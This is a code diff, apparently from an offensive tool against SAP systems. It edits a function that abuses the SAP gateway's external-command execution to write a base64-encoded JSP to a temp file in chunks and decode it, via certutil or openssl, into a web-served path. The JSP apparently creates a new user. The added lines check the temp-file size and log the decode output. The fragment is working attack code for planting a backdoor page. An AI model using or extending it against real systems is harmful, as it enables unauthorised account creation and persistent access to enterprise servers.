@@ -579,17 +579,38 @@ def deploy_create_user_jsp_via_gw(node, exec_fn, java_instance_nr: int,
           f"{len(jsp_b64)} base64 B in {total:.1f}s "
           f"({len(jsp_b64)/total/1024:.1f} KB/s)")
 
+    # 1b) Post-loop tmp-file size check — confirms every chunk actually
+    # appended.  Expected: exactly len(jsp_b64).  Anything less means
+    # later chunks didn't write (maybe 'ab' mode has a silent issue on
+    # this kernel).
+    if linux:
+        st_tmp = exec_fn("/usr/bin/stat", f"-c %s {tmp_b64}")
+        st_tmp_out = " ".join(str(l) for l in
+                                (st_tmp.get("output") or [])).strip()
+        expected = str(len(jsp_b64))
+        print(f"[*] {node.sid}: tmp-file size after chunks: "
+              f"{tmp_b64} -> {st_tmp_out or '<no output>'} "
+              f"(expected {expected})")
+        if st_tmp_out and not st_tmp_out.startswith(expected):
+            print(f"[!] {node.sid}: tmp file size mismatch — chunks "
+                  f"may have been truncated or lost")
+
     # 2) Decode to target JSP.  On Windows the /C wrapper is important
     #    so %TEMP% in the source path expands (SAPXPG does not resolve
     #    environment variables when invoking certutil directly).
     #    On Linux we use openssl with argv-only I/O (no shell).
+    print(f"[*] {node.sid}: decoding {tmp_b64} → {target_path} "
+          f"via {decode_shell}")
     r = exec_fn(decode_shell, decode_args)
+    dec_out = " ".join(str(l) for l in (r.get("output") or [])).strip()
+    print(f"[*] {node.sid}: decode stdout/stderr "
+          f"({len(dec_out)}B): {dec_out[:400] or '<empty>'}")
     if not r.get("success"):
         return {"success": False,
                 "error": f"decode step failed: {r.get('error', '?')}"}
     # Verify decode actually wrote the file (the shell returns success
     # exit code even on some file errors; stdout lines tell us more)
-    out_text = " ".join(r.get("output") or [])
+    out_text = dec_out
     low = out_text.lower()
     for marker in ("failed", "error", "no such file",
                      "can't exec external program", "exit code 1",
